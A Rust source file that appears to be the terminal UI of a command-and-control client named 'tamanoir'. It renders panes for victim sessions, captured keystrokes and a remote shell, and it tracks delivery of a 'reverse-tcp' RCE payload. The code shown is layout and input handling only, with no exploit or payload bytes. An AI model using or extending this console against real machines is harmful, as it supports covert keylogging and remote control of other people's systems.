pub mod keylogger;
pub mod session;
pub mod shell;

use std::fmt::Display;

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseEvent, MouseEventKind};
use ratatui::{
    layout::{Constraint, Direction, Layout, Margin, Rect},
    style::{Color, Style, Stylize},
    text::{Line, Span, Text},
    widgets::{Block, BorderType, Clear, Paragraph},
    Frame,
};
use shell::ShellCommandHistoryMap;

use crate::{
    app::{AppResult, SessionsMap},
    grpc::{RceServiceClient, RemoteShellServiceClient, SessionServiceClient},
    tamanoir_grpc::SessionResponse,
};

#[derive(Debug, PartialEq)]
pub enum FocusedSection {
    Sessions,
    KeyLogger,
    Shell,
    Rce,
}

#[derive(Debug)]
pub struct Sections {
    pub focused_section: FocusedSection,
    pub session_section: session::SessionSection,
    pub shell_percentage_split: Option<u16>,
}

impl Sections {
    pub async fn new(
        shell_history_map: ShellCommandHistoryMap,
        sessions: SessionsMap,
        session_client: &mut SessionServiceClient,
        rce_client: &mut RceServiceClient,
    ) -> AppResult<Self> {
        Ok(Self {
            focused_section: FocusedSection::Sessions,

            session_section: session::SessionSection::new(
                sessions,
                shell_history_map,
                session_client,
                rce_client,
            )
            .await?,
            shell_percentage_split: None,
        })
    }

    fn render_footer_help(&self, frame: &mut Frame, block: Rect) {
        let message = {
            let mut base_message = vec![
                Span::from(" ").bold(),
                Span::from(" Nav"),
                Span::from(" | "),
                Span::from("Ctrl + s:").bold(),
                Span::from(" (Un)Toggle Shell"),
            ];

            match self.focused_section {
                FocusedSection::Shell => {
                    base_message.extend([
                        Span::from(" | "),
                        Span::from("󰘶 + :").bold().yellow(),
                        Span::from(" Resize shell").yellow(),
                        Span::from(" | "),
                        Span::from("Ctrl + :").bold().yellow(),
                        Span::from(" Scroll").yellow(),
                    ]);
                    if self.session_section.shell.manual_scroll {
                        base_message.extend([
                            Span::from(" | "),
                            Span::from("󱊷 :").bold().yellow(),
                            Span::from(" Exit scroll mode").yellow(),
                        ])
                    }
                }
                FocusedSection::Sessions => {
                    if self.session_section.is_editing() {
                        base_message.extend([
                            Span::from(" | "),
                            Span::from(" 󱊷 :").bold().yellow(),
                            Span::from(" Exit Edit Mode").yellow(),
                            Span::from(" | "),
                            Span::from(" :").bold().yellow(),
                            Span::from(" Switch Edit Section").yellow(),
                            Span::from(" | "),
                            Span::from("󰌑 :").bold().yellow(),
                            Span::from(" Apply Change").yellow(),
                        ]);
                    } else {
                        base_message.extend([
                            Span::from(" | "),
                            Span::from("e:").bold().yellow(),
                            Span::from(" Edit Mode").yellow(),
                        ]);
                    }
                }
                _ => {}
            }

            base_message
        };

        let help = Text::from(vec![Line::from(message)]).blue().centered();

        frame.render_widget(
            Paragraph::new(help).centered().block(
                Block::bordered()
                    .border_type(BorderType::Rounded)
                    .border_style(Style::new().fg(Color::Blue)),
            ),
            block,
        );
    }

    fn shell_available(&self) -> bool {
        if let Some(session) = &self.session_section.selected_session {
            return session.get_shell_status() == ShellAvailablilityStatus::Connected;
        }
        false
    }
    pub fn render(&mut self, frame: &mut Frame) {
        let (main_block, help_block) = {
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([Constraint::Fill(1), Constraint::Length(3)])
                //.flex(ratatui::layout::Flex::)
                .split(frame.area());

            (chunks[0], chunks[1])
        };
        let (sessions_block, main_block) = {
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([Constraint::Length(7), Constraint::Fill(1)])
                //.flex(ratatui::layout::Flex::Start)
                .split(main_block);
            (chunks[0], chunks[1])
        };

        self.session_section.render(
            frame,
            sessions_block,
            self.focused_section == FocusedSection::Sessions,
        );

        self.render_footer_help(frame, help_block);

        let (keylogger_block, shell_block) = {
            match self.shell_percentage_split {
                Some(k) => {
                    let chunks = Layout::default()
                        .direction(Direction::Vertical)
                        .constraints([Constraint::Fill(1), Constraint::Percentage(k)])
                        //.flex(ratatui::layout::Flex::Center)
                        .split(main_block);
                    (chunks[0], Some(chunks[1]))
                }
                None => {
                    let chunks = Layout::default()
                        .direction(Direction::Vertical)
                        .constraints([Constraint::Fill(1)])
                        //.flex(ratatui::layout::Flex::SpaceBetween)
                        .split(main_block);
                    (chunks[0], None)
                }
            }
        };
        keylogger::render(
            frame,
            keylogger_block,
            &mut self.session_section.selected_session,
            self.focused_section == FocusedSection::KeyLogger,
        );
        if let Some(shell_block) = shell_block {
            if let Some(session_id) = &self.session_section.selected_session {
                self.session_section.shell.render(
                    frame,
                    shell_block,
                    self.focused_section == FocusedSection::Shell,
                    session_id.ip.clone(),
                    self.shell_available(),
                );
            }
        }
        if self.focused_section == FocusedSection::Sessions && self.session_section.edition_mode {
            let popup_block = main_block.inner(Margin {
                horizontal: 3,
                vertical: 3,
            });
            frame.render_widget(Clear, popup_block);

            self.session_section
                .render_session_edition(frame, popup_block);
        }
    }
    pub async fn handle_mouse(&mut self, mouse_event: MouseEvent) -> AppResult<()> {
        match mouse_event.kind {
            MouseEventKind::ScrollUp => match self.focused_section {
                FocusedSection::Shell if self.shell_available() => {
                    self.session_section.shell.scroll_up()
                }
                _ => {}
            },
            MouseEventKind::ScrollDown => match self.focused_section {
                FocusedSection::Shell if self.shell_available() => {
                    self.session_section.shell.scroll_down()
                }
                _ => {}
            },

            MouseEventKind::Down(_) => {}
            MouseEventKind::Up(_) => {}
            _ => {}
        }
        Ok(())
    }

    pub async fn handle_keys(
        &mut self,
        key_event: KeyEvent,
        shell_client: &mut RemoteShellServiceClient,
        session_client: &mut SessionServiceClient,
        rce_client: &mut RceServiceClient,
    ) -> AppResult<()> {
        match key_event.code {
            KeyCode::Tab => {
                if self.session_section.is_editing() {
                    self.session_section.next_edit_section()
                } else {
                    match self.focused_section {
                        FocusedSection::Sessions => {
                            self.focused_section = FocusedSection::KeyLogger
                        }
                        FocusedSection::KeyLogger => {
                            if self.shell_percentage_split.is_some() {
                                self.focused_section = FocusedSection::Shell
                            } else {
                                self.focused_section = FocusedSection::Sessions
                            }
                        }
                        FocusedSection::Shell => self.focused_section = FocusedSection::Sessions,
                        _ => {}
                    }
                }
            }
            KeyCode::BackTab => {
                if self.session_section.is_editing() {
                    self.session_section.previous_edit_section()
                } else {
                    match self.focused_section {
                        FocusedSection::KeyLogger => {
                            self.focused_section = FocusedSection::Sessions
                        }
                        FocusedSection::Shell => self.focused_section = FocusedSection::KeyLogger,
                        FocusedSection::Sessions => {
                            if self.shell_percentage_split.is_some() {
                                self.focused_section = FocusedSection::Shell
                            } else {
                                self.focused_section = FocusedSection::KeyLogger
                            }
                        }
                        _ => {}
                    }
                }
            }
            KeyCode::Char('s') if key_event.modifiers == KeyModifiers::CONTROL => {
                if self.shell_percentage_split.is_some() {
                    self.shell_percentage_split = None;
                    if self.focused_section == FocusedSection::Shell {
                        self.focused_section = FocusedSection::Sessions;
                    }
                } else {
                    self.shell_percentage_split = Some(20);
                    self.focused_section = FocusedSection::Shell;
                }
            }
            KeyCode::Char('J') | KeyCode::Down
                if (key_event.modifiers == KeyModifiers::SHIFT
                    && self.focused_section == FocusedSection::Shell) =>
            {
                if let Some(split) = self.shell_percentage_split {
                    self.shell_percentage_split = Some(split.saturating_sub(5).max(20))
                };
            }
            KeyCode::Char('K') | KeyCode::Up
                if (key_event.modifiers == KeyModifiers::SHIFT
                    && self.focused_section == FocusedSection::Shell) =>
            {
                if let Some(split) = self.shell_percentage_split {
                    self.shell_percentage_split = Some((split + 5).min(90));
                }
            }

            _ => match self.focused_section {
                FocusedSection::Sessions => match key_event.code {
                    KeyCode::Char('j') | KeyCode::Down => self.session_section.next_item(),
                    KeyCode::Char('k') | KeyCode::Up => self.session_section.previous_item(),
                    KeyCode::Char('e') if self.session_section.selected_session.is_some() => {
                        self.session_section.edition_mode = true;
                    }
                    KeyCode::Esc if self.session_section.is_editing() => {
                        self.session_section.edition_mode = false;
                    }

                    KeyCode::Enter if self.session_section.is_editing() => {
                        let _ = self
                            .session_section
                            .apply_change(session_client, rce_client)
                            .await?;
                    }
                    _ => {}
                },
                FocusedSection::KeyLogger => match key_event.code {
                    _ => {}
                },
                FocusedSection::Shell if self.shell_available() => {
                    self.session_section
                        .shell
                        .handle_keys(
                            key_event,
                            shell_client,
                            rce_client,
                            self.session_section.selected_session.clone().unwrap().ip,
                        )
                        .await?;
                }

                _ => {}
            },
        }

        Ok(())
    }
}
#[derive(PartialEq)]
pub enum ShellAvailablilityStatus {
    NotSelectedForTransmission,
    Transmiting,
    Connected,
}

impl Display for ShellAvailablilityStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let msg = match self {
            Self::Connected => "Connected ",
            Self::Transmiting => "Waiting for tx to complete...",
            Self::NotSelectedForTransmission => "Unavailable",
        };
        write!(f, "{}", msg)
    }
}

impl SessionResponse {
    fn get_shell_status(&self) -> ShellAvailablilityStatus {
        match &self.rce_payload {
            Some(rce_payload) => {
                if rce_payload.name == "reverse-tcp" {
                    if rce_payload.buffer_length > 0 {
                        ShellAvailablilityStatus::Transmiting
                    } else {
                        ShellAvailablilityStatus::Connected
                    }
                } else {
                    ShellAvailablilityStatus::NotSelectedForTransmission
                }
            }

            None => ShellAvailablilityStatus::NotSelectedForTransmission,
        }
    }
}
